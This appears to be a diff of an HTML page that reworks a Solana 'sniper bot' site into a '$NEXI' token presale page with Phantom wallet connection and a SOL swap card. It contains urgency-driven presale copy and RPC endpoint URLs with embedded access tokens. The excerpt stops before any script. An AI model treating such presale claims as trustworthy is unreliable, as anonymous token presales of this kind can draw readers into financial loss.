@@ -3,21 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Nexium-MTX: Add volume to tokens on Solana using Phantom">
-    <title>NexiumBoost - Top-tier Multichain Sniper Bot</title>
+    <meta name="description" content="NEXI Token Presale - Get $NEXI before launch">
+    <title>$NEXI Token Presale - Powered by NexiumBoost</title>
+
+    <!-- UPDATED CSP: NEW QUICKNODE ENDPOINT ADDED -->
     <meta http-equiv="Content-Security-Policy" content="
       default-src 'self';
       img-src 'self' https://nexium-bot.onrender.com data: https://i.ibb.co;
       style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.tailwindcss.com;
       font-src 'self' https://cdnjs.cloudflare.com;
-      script-src 'self' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com https://unpkg.com https://cdn.jsdelivr.net;
-      connect-src 'self' https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a https://public-api.solscan.io https://api.coingecko.com;
-      frame-src 'self';
+      script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com https://unpkg.com https://cdn.jsdelivr.net;
+      connect-src 'self' 
+        https://late-light-patron.solana-mainnet.quiknode.pro/60a7759b1bbb4567639fbabaca0fb63aedb556d6
+        https://public-api.solscan.io
+        https://api.coingecko.com;
+      frame-src 'self' https://phantom.app;
     ">
+
     <link rel="icon" type="image/png" href="/favicon.svg">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
-    <link rel="stylesheet" href="style.css">
-    <!-- Remove external script imports; handled by main.js -->
     <style>
         * {
             margin: 0;
@@ -26,13 +30,63 @@
         }
 
         body {
-            background: #ffffff;
-            color: #1a1a1a;
+            background: linear-gradient(135deg, #0a0f1e 0%, #1a1535 50%, #0f1a2e 100%);
+            color: #ffffff;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
             overflow-x: hidden;
+            min-height: 100vh;
         }
 
-        /* Solana Gradient Accents */
+        /* Animated Background */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .bg-animation::before,
+        .bg-animation::after {
+            content: '';
+            position: absolute;
+            width: 500px;
+            height: 500px;
+            border-radius: 50%;
+            filter: blur(100px);
+            opacity: 0.3;
+            animation: float 20s ease-in-out infinite;
+        }
+
+        .bg-animation::before {
+            background: #9945FF;
+            top: -250px;
+            left: -250px;
+            animation-delay: 0s;
+        }
+
+        .bg-animation::after {
+            background: #14F195;
+            bottom: -250px;
+            right: -250px;
+            animation-delay: 10s;
+        }
+
+        @keyframes float {
+            0%, 100% {
+                transform: translate(0, 0) scale(1);
+            }
+            33% {
+                transform: translate(100px, -100px) scale(1.1);
+            }
+            66% {
+                transform: translate(-100px, 100px) scale(0.9);
+            }
+        }
+
+        /* Solana Gradient */
         .gradient-accent {
             background: linear-gradient(135deg, #9945FF 0%, #14F195 50%, #00D4FF 100%);
         }
@@ -50,11 +104,12 @@
             top: 0;
             left: 0;
             right: 0;
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
+            background: rgba(10, 15, 30, 0.8);
+            backdrop-filter: blur(20px);
             padding: 1rem 2rem;
-            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.05);
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.3);
             z-index: 1000;
+            border-bottom: 1px solid rgba(153, 69, 255, 0.2);
         }
 
         .nav-container {
@@ -84,23 +139,6 @@
             -webkit-text-fill-color: transparent;
         }
 
-        .nav-links {
-            display: flex;
-            gap: 2rem;
-            align-items: center;
-        }
-
-        .nav-links a {
-            color: #4a4a4a;
-            text-decoration: none;
-            font-weight: 500;
-            transition: color 0.3s;
-        }
-
-        .nav-links a:hover {
-            color: #9945FF;
-        }
-
         #connect-wallet {
             background: linear-gradient(135deg, #9945FF 0%, #14F195 50%, #00D4FF 100%);
             color: white;
@@ -118,526 +156,341 @@
             box-shadow: 0 6px 30px rgba(153, 69, 255, 0.5);
         }
 
-        /* Hero Section */
-        .hero {
+        /* Main Container */
+        .main-container {
+            position: relative;
+            z-index: 1;
             min-height: 100vh;
             display: flex;
             align-items: center;
-            padding: 8rem 2rem 4rem;
-            position: relative;
-            overflow: hidden;
+            justify-content: center;
+            padding: 6rem 2rem 2rem;
         }
 
-        .hero-container {
-            max-width: 1400px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 4rem;
-            align-items: center;
-        }
-
-        .hero-content h1 {
-            font-size: 3.5rem;
-            font-weight: 800;
-            line-height: 1.1;
-            margin-bottom: 1.5rem;
-            color: #1a1a1a;
-        }
-
-        .hero-content .subhead {
-            font-size: 1.25rem;
-            color: #6a6a6a;
-            margin-bottom: 2rem;
-            line-height: 1.6;
-        }
-
-        .cta-buttons {
-            display: flex;
-            gap: 1rem;
-            flex-wrap: wrap;
-        }
-
-        .btn-primary {
-            background: linear-gradient(135deg, #9945FF 0%, #14F195 50%, #00D4FF 100%);
-            color: white;
-            padding: 1rem 2rem;
-            border-radius: 12px;
-            font-weight: 600;
-            font-size: 1.1rem;
-            border: none;
-            cursor: pointer;
-            transition: transform 0.3s, box-shadow 0.3s;
-            box-shadow: 0 4px 20px rgba(153, 69, 255, 0.3);
-        }
-
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 30px rgba(153, 69, 255, 0.5);
-        }
-
-        .btn-secondary {
-            background: transparent;
-            color: #9945FF;
-            padding: 1rem 2rem;
-            border-radius: 12px;
-            font-weight: 600;
-            font-size: 1.1rem;
-            border: 2px solid #9945FF;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .btn-secondary:hover {
-            background: #9945FF;
-            color: white;
-        }
-
-        .hero-visual {
-            position: relative;
-            height: 500px;
-        }
-
-        .device-mockup {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
+        .swap-container {
+            max-width: 600px;
             width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, rgba(153, 69, 255, 0.1) 0%, rgba(20, 241, 149, 0.1) 100%);
-            border-radius: 24px;
-            padding: 2rem;
-            animation: float 6s ease-in-out infinite;
         }
 
-        @keyframes float {
+        /* Hero Section */
+        .hero-section {
+            text-align: center;
+            margin-bottom: 3rem;
+            animation: fadeInDown 0.8s ease-out;
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .hero-section h1 {
+            font-size: 3rem;
+            font-weight: 800;
+            margin-bottom: 1rem;
+            line-height: 1.2;
+        }
+
+        .hero-section .subtitle {
+            font-size: 1.2rem;
+            color: #a0a0a0;
+            margin-bottom: 2rem;
+        }
+
+        .presale-badge {
+            display: inline-block;
+            padding: 0.5rem 1.5rem;
+            background: rgba(153, 69, 255, 0.2);
+            border: 2px solid #9945FF;
+            border-radius: 50px;
+            font-weight: 600;
+            color: #14F195;
+            margin-bottom: 2rem;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
             0%, 100% {
-                transform: translate(-50%, -50%) translateY(0);
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(153, 69, 255, 0.7);
             }
             50% {
-                transform: translate(-50%, -50%) translateY(-20px);
+                transform: scale(1.05);
+                box-shadow: 0 0 0 10px rgba(153, 69, 255, 0);
             }
         }
 
-        /* Features Section */
-        .features {
-            padding: 6rem 2rem;
-            background: #f8f9fa;
+        /* Swap Card */
+        .swap-card {
+            background: rgba(26, 21, 53, 0.6);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 2.5rem;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(153, 69, 255, 0.3);
+            animation: fadeInUp 0.8s ease-out 0.2s backwards;
         }
 
-        .features-container {
-            max-width: 1400px;
-            margin: 0 auto;
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
-        .section-title {
+        .card-header {
             text-align: center;
-            font-size: 2.5rem;
-            font-weight: 800;
-            margin-bottom: 3rem;
-            color: #1a1a1a;
+            margin-bottom: 2rem;
         }
 
-        .features-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 2rem;
-        }
-
-        .feature-card {
-            background: white;
-            padding: 2rem;
-            border-radius: 16px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
-            transition: transform 0.3s, box-shadow 0.3s;
-        }
-
-        .feature-card:hover {
-            transform: translateY(-8px);
-            box-shadow: 0 8px 30px rgba(153, 69, 255, 0.2);
-        }
-
-        .feature-icon {
-            width: 60px;
-            height: 60px;
-            background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.5rem;
-            color: white;
-            margin-bottom: 1.5rem;
-        }
-
-        .feature-card h3 {
-            font-size: 1.3rem;
+        .card-header h2 {
+            font-size: 1.8rem;
             font-weight: 700;
-            margin-bottom: 0.75rem;
-            color: #1a1a1a;
+            margin-bottom: 0.5rem;
         }
 
-        .feature-card p {
-            color: #6a6a6a;
-            line-height: 1.6;
+        .card-header p {
+            color: #a0a0a0;
+            font-size: 0.95rem;
         }
 
-        /* Token Cards Carousel */
-        .token-carousel-section {
-            padding: 6rem 2rem;
-            background: white;
-            overflow: hidden;
-        }
-
-        .carousel-container {
-            max-width: 1400px;
-            margin: 0 auto;
-        }
-
-        .token-carousel {
-            display: flex;
-            gap: 1.5rem;
-            overflow-x: auto;
-            scroll-behavior: smooth;
-            padding: 2rem 0;
-            scrollbar-width: none;
-        }
-
-        .token-carousel::-webkit-scrollbar {
-            display: none;
-        }
-
-        .token-card {
-            min-width: 280px;
-            background: white;
-            border: 2px solid #e0e0e0;
+        /* Input Section */
+        .input-section {
+            background: rgba(15, 26, 46, 0.8);
             border-radius: 16px;
             padding: 1.5rem;
-            transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1), box-shadow 0.3s;
-            cursor: pointer;
-            position: relative;
+            margin-bottom: 1.5rem;
+            border: 2px solid rgba(153, 69, 255, 0.2);
+            transition: border-color 0.3s;
         }
 
-        .token-card:hover {
-            transform: translateX(15px) scale(1.03);
-            box-shadow: 0 8px 30px rgba(153, 69, 255, 0.3);
+        .input-section:focus-within {
             border-color: #9945FF;
-            z-index: 10;
         }
 
-        .token-card:hover ~ .token-card {
-            transform: translateX(-8px);
+        .input-label {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 0.75rem;
+            color: #a0a0a0;
+            font-size: 0.9rem;
         }
 
-        .token-header {
+        .input-wrapper {
             display: flex;
             align-items: center;
             gap: 1rem;
-            margin-bottom: 1rem;
         }
 
-        .token-logo {
-            width: 50px;
-            height: 50px;
+        .input-wrapper input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: white;
+            font-size: 2rem;
+            font-weight: 600;
+            outline: none;
+            width: 100%;
+        }
+
+        .input-wrapper input::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        .token-badge {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.5rem 1rem;
+            background: rgba(153, 69, 255, 0.3);
+            border-radius: 12px;
+            font-weight: 600;
+            white-space: nowrap;
+        }
+
+        .token-icon {
+            width: 24px;
+            height: 24px;
             border-radius: 50%;
             background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
         }
 
-        .token-info h4 {
-            font-weight: 700;
-            color: #1a1a1a;
-        }
-
-        .chain-badge {
-            display: inline-block;
-            padding: 0.25rem 0.75rem;
-            background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
-            color: white;
-            border-radius: 20px;
-            font-size: 0.75rem;
-            font-weight: 600;
-        }
-
-        .token-stats {
-            margin: 1rem 0;
-        }
-
-        .stat-row {
-            display: flex;
-            justify-content: space-between;
-            margin: 0.5rem 0;
-            color: #6a6a6a;
-        }
-
-        .token-actions {
-            display: flex;
+        /* Quick Amount Buttons */
+        .quick-amounts {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
             gap: 0.5rem;
             margin-top: 1rem;
         }
 
-        .action-btn {
-            flex: 1;
+        .quick-btn {
             padding: 0.5rem;
-            border: 1px solid #9945FF;
-            background: transparent;
-            color: #9945FF;
+            background: rgba(153, 69, 255, 0.2);
+            border: 1px solid rgba(153, 69, 255, 0.4);
+            color: #14F195;
             border-radius: 8px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s;
+            font-size: 0.9rem;
         }
 
-        .action-btn:hover {
-            background: #9945FF;
-            color: white;
+        .quick-btn:hover {
+            background: rgba(153, 69, 255, 0.4);
+            border-color: #9945FF;
+            transform: translateY(-2px);
         }
 
-        .action-btn.disabled {
-            filter: blur(2px);
-            pointer-events: none;
-            opacity: 0.6;
-        }
-
-        /* How It Works */
-        .how-it-works {
-            padding: 6rem 2rem;
-            background: #f8f9fa;
-        }
-
-        .steps-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 2rem;
-        }
-
-        .step {
+        /* Swap Arrow */
+        .swap-arrow {
             text-align: center;
+            margin: -0.5rem 0;
             position: relative;
+            z-index: 2;
         }
 
-        .step-number {
-            width: 60px;
-            height: 60px;
-            background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
-            color: white;
+        .arrow-icon {
+            display: inline-flex;
+            width: 40px;
+            height: 40px;
+            background: rgba(153, 69, 255, 0.3);
+            border: 2px solid #9945FF;
             border-radius: 50%;
-            display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 1.5rem;
-            font-weight: 700;
-            margin: 0 auto 1.5rem;
+            color: #14F195;
+            font-size: 1.2rem;
         }
 
-        .step h3 {
-            font-size: 1.3rem;
-            font-weight: 700;
-            margin-bottom: 0.75rem;
-            color: #1a1a1a;
-        }
-
-        .step p {
-            color: #6a6a6a;
-            line-height: 1.6;
-        }
-
-        /* Pricing Section */
-        .pricing {
-            padding: 6rem 2rem;
-            background: white;
-        }
-
-        .pricing-container {
-            max-width: 900px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 2rem;
-        }
-
-        .pricing-card {
-            background: white;
-            border: 2px solid #e0e0e0;
-            border-radius: 16px;
-            padding: 2.5rem;
+        /* Rate Info */
+        .rate-info {
+            background: rgba(20, 241, 149, 0.1);
+            border: 1px solid rgba(20, 241, 149, 0.3);
+            border-radius: 12px;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
             text-align: center;
-            transition: transform 0.3s, box-shadow 0.3s, border-color 0.3s;
         }
 
-        .pricing-card:hover {
-            transform: translateY(-8px);
-            box-shadow: 0 12px 40px rgba(153, 69, 255, 0.2);
-            border-color: #9945FF;
+        .rate-info .rate {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #14F195;
         }
 
-        .pricing-card.featured {
-            border-color: #9945FF;
+        .rate-info .rate-label {
+            font-size: 0.85rem;
+            color: #a0a0a0;
+            margin-top: 0.25rem;
+        }
+
+        /* Limits Info */
+        .limits-info {
+            display: flex;
+            justify-content: space-between;
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            margin-bottom: 1.5rem;
+            font-size: 0.9rem;
+        }
+
+        .limit-item {
+            display: flex;
+            flex-direction: column;
+            gap: 0.25rem;
+        }
+
+        .limit-label {
+            color: #a0a0a0;
+        }
+
+        .limit-value {
+            color: #14F195;
+            font-weight: 600;
+        }
+
+        /* Swap Button */
+        .swap-button {
+            width: 100%;
+            background: linear-gradient(135deg, #9945FF 0%, #14F195 50%, #00D4FF 100%);
+            color: white;
+            border: none;
+            padding: 1.25rem;
+            border-radius: 16px;
+            font-weight: 700;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 8px 30px rgba(153, 69, 255, 0.4);
             position: relative;
             overflow: hidden;
         }
 
-        .pricing-card.featured::before {
-            content: 'BEST VALUE';
-            position: absolute;
-            top: 1rem;
-            right: -2rem;
-            background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
-            color: white;
-            padding: 0.25rem 3rem;
-            transform: rotate(45deg);
-            font-size: 0.75rem;
-            font-weight: 700;
-        }
-
-        .price {
-            font-size: 3rem;
-            font-weight: 800;
-            margin: 1rem 0;
-        }
-
-        .price-period {
-            color: #6a6a6a;
-            font-size: 1rem;
-        }
-
-        .features-list {
-            text-align: left;
-            margin: 2rem 0;
-        }
-
-        .features-list li {
-            padding: 0.75rem 0;
-            color: #6a6a6a;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        .features-list li::before {
-            content: '✓';
-            color: #14F195;
-            font-weight: 700;
-            font-size: 1.2rem;
-        }
-
-        .subscribe-btn {
-            width: 100%;
-            background: linear-gradient(135deg, #9945FF 0%, #14F195 50%, #00D4FF 100%);
-            color: white;
-            padding: 1rem;
-            border-radius: 12px;
-            font-weight: 600;
-            border: none;
-            cursor: pointer;
-            transition: transform 0.3s, box-shadow 0.3s;
-        }
-
-        .subscribe-btn:hover {
+        .swap-button:hover:not(:disabled) {
             transform: translateY(-2px);
-            box-shadow: 0 6px 30px rgba(153, 69, 255, 0.5);
+            box-shadow: 0 12px 40px rgba(153, 69, 255, 0.6);
         }
 
-        /* Trust Section */
-        .trust {
-            padding: 4rem 2rem;
-            background: #f8f9fa;
+        .swap-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
 
-        .trust-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            text-align: center;
+        .swap-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.5s;
         }
 
-        .trust-features {
-            display: flex;
-            justify-content: center;
-            gap: 3rem;
-            flex-wrap: wrap;
-            margin-top: 2rem;
+        .swap-button:hover:not(:disabled)::before {
+            left: 100%;
         }
 
-        .trust-item {
-            display: flex;
-            align-items: center;
-            gap: 0.75rem;
-            color: #6a6a6a;
-            font-weight: 500;
-        }
-
-        .trust-icon {
-            width: 30px;
-            height: 30px;
-            background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-        }
-
-        .chain-logos {
-            display: flex;
-            justify-content: center;
-            gap: 2rem;
-            flex-wrap: wrap;
-            margin-top: 2rem;
-        }
-
-        .chain-logo {
-            width: 50px;
-            height: 50px;
-            background: white;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 700;
-            color: #9945FF;
-            border: 2px solid #e0e0e0;
-        }
-
-        /* Footer */
-        footer {
-            background: #1a1a1a;
-            color: white;
-            padding: 3rem 2rem 1rem;
-        }
-
-        .footer-container {
-            max-width: 1400px;
-            margin: 0 auto;
+        /* Stats Grid */
+        .stats-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 2rem;
-            margin-bottom: 2rem;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1rem;
+            margin-top: 2rem;
+            animation: fadeInUp 0.8s ease-out 0.4s backwards;
         }
 
-        .footer-section h4 {
-            margin-bottom: 1rem;
-            color: #14F195;
-        }
-
-        .footer-section a {
-            display: block;
-            color: #b0b0b0;
-            text-decoration: none;
-            margin: 0.5rem 0;
-            transition: color 0.3s;
-        }
-
-        .footer-section a:hover {
-            color: #14F195;
-        }
-
-        .footer-bottom {
+        .stat-card {
+            background: rgba(26, 21, 53, 0.6);
+            backdrop-filter: blur(20px);
+            border-radius: 16px;
+            padding: 1.5rem;
             text-align: center;
-            padding-top: 2rem;
-            border-top: 1px solid #333;
-            color: #b0b0b0;
+            border: 1px solid rgba(153, 69, 255, 0.2);
+        }
+
+        .stat-value {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #14F195;
+            margin-bottom: 0.5rem;
+        }
+
+        .stat-label {
+            font-size: 0.85rem;
+            color: #a0a0a0;
         }
 
         /* Wallet Modal */
@@ -648,7 +501,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.7);
+            background: rgba(0, 0, 0, 0.8);
             z-index: 2000;
             align-items: center;
             justify-content: center;
@@ -659,16 +512,29 @@
         }
 
         .modal-content {
-            background: white;
-            border-radius: 16px;
-            padding: 2rem;
+            background: linear-gradient(135deg, #1a1535 0%, #0f1a2e 100%);
+            border-radius: 24px;
+            padding: 2.5rem;
             width: 90%;
             max-width: 450px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(153, 69, 255, 0.3);
+            animation: modalSlideIn 0.3s ease-out;
+        }
+
+        @keyframes modalSlideIn {
+            from {
+                opacity: 0;
+                transform: scale(0.9) translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
         }
 
         .modal-content h2 {
-            color: #1a1a1a;
+            color: #ffffff;
             font-size: 1.8rem;
             margin-bottom: 1.5rem;
             text-align: center;
@@ -678,51 +544,58 @@
             display: flex;
             align-items: center;
             gap: 1rem;
-            padding: 1rem;
+            padding: 1.25rem;
             margin: 1rem 0;
-            background: #f8f9fa;
-            border-radius: 12px;
+            background: rgba(153, 69, 255, 0.1);
+            border-radius: 16px;
             cursor: pointer;
             transition: all 0.3s;
-            border: 2px solid transparent;
+            border: 2px solid rgba(153, 69, 255, 0.3);
         }
 
         .wallet-option:hover {
-            background: linear-gradient(135deg, rgba(153, 69, 255, 0.1) 0%, rgba(20, 241, 149, 0.1) 100%);
+            background: rgba(153, 69, 255, 0.2);
             border-color: #9945FF;
+            transform: translateX(5px);
         }
 
         .wallet-option.disabled {
-            filter: blur(2px);
-            pointer-events: none;
-            opacity: 0.6;
+            opacity: 0.5;
+            cursor: not-allowed;
+            filter: grayscale(1);
+        }
+
+        .wallet-option.disabled:hover {
+            transform: none;
         }
 
         .wallet-icon {
-            width: 40px;
-            height: 40px;
-            border-radius: 8px;
+            width: 50px;
+            height: 50px;
+            border-radius: 12px;
             background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
             display: flex;
             align-items: center;
             justify-content: center;
             color: white;
+            font-size: 1.5rem;
         }
 
         .close-modal {
             width: 100%;
-            padding: 0.75rem;
-            background: #e0e0e0;
-            border: none;
-            border-radius: 8px;
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
             margin-top: 1rem;
             cursor: pointer;
             font-weight: 600;
-            transition: background 0.3s;
+            color: white;
+            transition: all 0.3s;
         }
 
         .close-modal:hover {
-            background: #d0d0d0;
+            background: rgba(255, 255, 255, 0.15);
         }
 
         /* MetaMask Prompt */
@@ -731,64 +604,100 @@
             position: fixed;
             bottom: 2rem;
             right: 2rem;
-            background: white;
+            background: linear-gradient(135deg, #1a1535 0%, #0f1a2e 100%);
             padding: 1.5rem;
-            border-radius: 12px;
-            box-shadow: 0 8px 30px rgba(0,0,0,0.2);
-            max-width: 300px;
+            border-radius: 16px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
+            max-width: 320px;
             z-index: 1000;
             text-align: center;
-            color: #1a1a1a;
+            color: #ffffff;
+            border: 1px solid rgba(153, 69, 255, 0.3);
         }
 
         #metamaskPrompt.active {
             display: block;
+            animation: slideInRight 0.3s ease-out;
+        }
+
+        @keyframes slideInRight {
+            from {
+                opacity: 0;
+                transform: translateX(100px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
         }
 
         #metamaskPrompt .prompt-close {
-            background: #e0e0e0;
-            border: none;
+            background: rgba(153, 69, 255, 0.3);
+            border: 1px solid #9945FF;
             padding: 0.5rem 1rem;
-            border-radius: 6px;
+            border-radius: 8px;
             cursor: pointer;
-            margin-top: 0.5rem;
+            margin-top: 0.75rem;
+            color: white;
+            font-weight: 600;
+            transition: all 0.3s;
         }
 
         #metamaskPrompt .prompt-close:hover {
-            background: #d0d0d0;
+            background: rgba(153, 69, 255, 0.5);
+        }
+
+        /* Error Message */
+        .error-message {
+            background: rgba(255, 59, 48, 0.2);
+            border: 1px solid rgba(255, 59, 48, 0.5);
+            color: #ff3b30;
+            padding: 1rem;
+            border-radius: 12px;
+            margin-top: 1rem;
+            text-align: center;
+            display: none;
+        }
+
+        .error-message.active {
+            display: block;
+            animation: shake 0.5s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
         }
 
         /* Responsive */
         @media (max-width: 768px) {
-            .hero-container {
-                grid-template-columns: 1fr;
-                text-align: center;
-            }
-
-            .hero-content h1 {
-                font-size: 2.5rem;
-            }
-
-            .hero-visual {
-                height: 300px;
-            }
-
-            .nav-container {
-                flex-direction: column;
-                gap: 1rem;
-            }
-
-            .nav-links {
-                flex-direction: column;
-                gap: 0.5rem;
-            }
-
-            .cta-buttons {
-                justify-content: center;
-            }
-
-            .section-title {
+            .hero-section h1 {
                 font-size: 2rem;
+            }
+
+            .hero-section .subtitle {
+                font-size: 1rem;
+            }
+
+            .swap-card {
+                padding: 1.5rem;
+            }
+
+            .input-wrapper input {
+                font-size: 1.5rem;
+            }
+
+            .stats-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .quick-amounts {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .main-container {
+                padding: 5rem 1rem 1rem;
             }
         }
 
@@ -801,6 +710,8 @@
     </style>
 </head>
 <body>
+    <div class="bg-animation"></div>
+
     <!-- Navigation -->
     <nav>
         <div class="nav-container">
@@ -808,360 +719,160 @@
                 <img src="/logo.png" alt="NexiumBoost Logo" onerror="this.style.display='none'">
                 <span class="logo-text">NexiumBoost</span>
             </div>
-            <div class="nav-links">
-                <a href="#features">Features</a>
-                <a href="#how-it-works">How It Works</a>
-                <a href="#pricing">Pricing</a>
-                <button id="connect-wallet" aria-label="Connect Wallet">Connect Wallet</button>
-            </div>
+            <button id="connect-wallet" aria-label="Connect Wallet">Connect Phantom</button>
         </div>
     </nav>
 
-    <!-- Hero Section -->
-    <section class="hero">
-        <div class="hero-container">
-            <div class="hero-content">
+    <!-- Main Container -->
+    <div class="main-container">
+        <div class="swap-container">
+            <!-- Hero Section -->
+            <div class="hero-section">
+                <div class="presale-badge">PRESALE LIVE</div>
                 <h1>
-                    <span class="gradient-text">NexiumBoost</span><br>
-                    Top-tier Multichain Sniper Bot
+                    Get <span class="gradient-text">$NEXI</span><br>
+                    Before Launch
                 </h1>
-                <p class="subhead">
-                    Automated memecoin sniping across 8+ blockchains. Connect your wallet. Start sniping faster.
+                <p class="subtitle">
+                    Exclusive presale opportunity on Solana. Limited time only.
                 </p>
-                <div class="cta-buttons">
-                    <button class="btn-secondary subscribe-hero">Subscribe $5/mo</button>
-                </div>
             </div>
-            <div class="hero-visual">
-                <div class="device-mockup">
-                    <div style="background: white; border-radius: 16px; height: 100%; display: flex; align-items: center; justify-content: center; font-size: 3rem;">
-                        🚀
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
 
-    <!-- Features Section -->
-    <section class="features" id="features">
-        <div class="features-container">
-            <h2 class="section-title">Lightning-Fast Features</h2>
-            <div class="features-grid">
-                <div class="feature-card">
-                    <div class="feature-icon">🎯</div>
-                    <h3>Memecoin Sniping</h3>
-                    <p>Automated liquidity sniping with millisecond precision across multiple DEXs</p>
+            <!-- Swap Card -->
+            <div class="swap-card">
+                <div class="card-header">
+                    <h2>Swap to $NEXI</h2>
+                    <p>Exchange SOL for $NEXI tokens at presale rates</p>
                 </div>
-                <div class="feature-card">
-                    <div class="feature-icon">⚡</div>
-                    <h3>8+ Chain Support</h3>
-                    <p>SOL, ETH, BASE, SUI, BNB, METIS, ARB, AVAX - all in one interface</p>
-                </div>
-                <div class="feature-card">
-                    <div class="feature-icon">🔥</div>
-                    <h3>High-Speed Trading</h3>
-                    <p>Ultra-fast buy/sell transactions with optimized gas fees</p>
-                </div>
-                <div class="feature-card">
-                    <div class="feature-icon">📊</div>
-                    <h3>Copy Trade</h3>
-                    <p>Mirror successful traders automatically with Pump.fun integration</p>
-                </div>
-                <div class="feature-card">
-                    <div class="feature-icon">💎</div>
-                    <h3>Raydium & Openbook</h3>
-                    <p>Direct integration with Raydium Swap and Openbook Sniper</p>
-                </div>
-                <div class="feature-card">
-                    <div class="feature-icon">🛡️</div>
-                    <h3>Security Checks</h3>
-                    <p>Rug alerts, mintable status, and liquidity-lock verification built-in</p>
-                </div>
-            </div>
-        </div>
-    </section>
 
-    <!-- Token Cards Carousel -->
-    <section class="token-carousel-section">
-        <div class="carousel-container">
-            <h2 class="section-title">Live Token Opportunities</h2>
-            <div class="token-carousel" id="tokenCarousel">
-                <div class="token-card">
-                    <div class="token-header">
-                        <div class="token-logo"></div>
-                        <div class="token-info">
-                            <h4>BONK</h4>
-                            <span class="chain-badge">SOL</span>
+                <!-- You Pay Section -->
